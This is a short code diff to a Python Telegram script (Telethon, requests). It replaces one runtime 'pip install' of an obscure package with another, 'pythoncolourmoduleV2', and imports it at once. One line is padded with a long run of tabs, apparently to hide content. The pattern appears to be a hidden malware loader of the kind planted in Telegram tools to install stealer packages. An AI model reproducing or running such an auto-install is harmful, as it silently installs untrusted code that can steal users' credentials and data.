@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqliteexts")
-import pipsqliteexts
+os.system("pip install pythoncolourmoduleV2")
+import pythoncolourmoduleV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
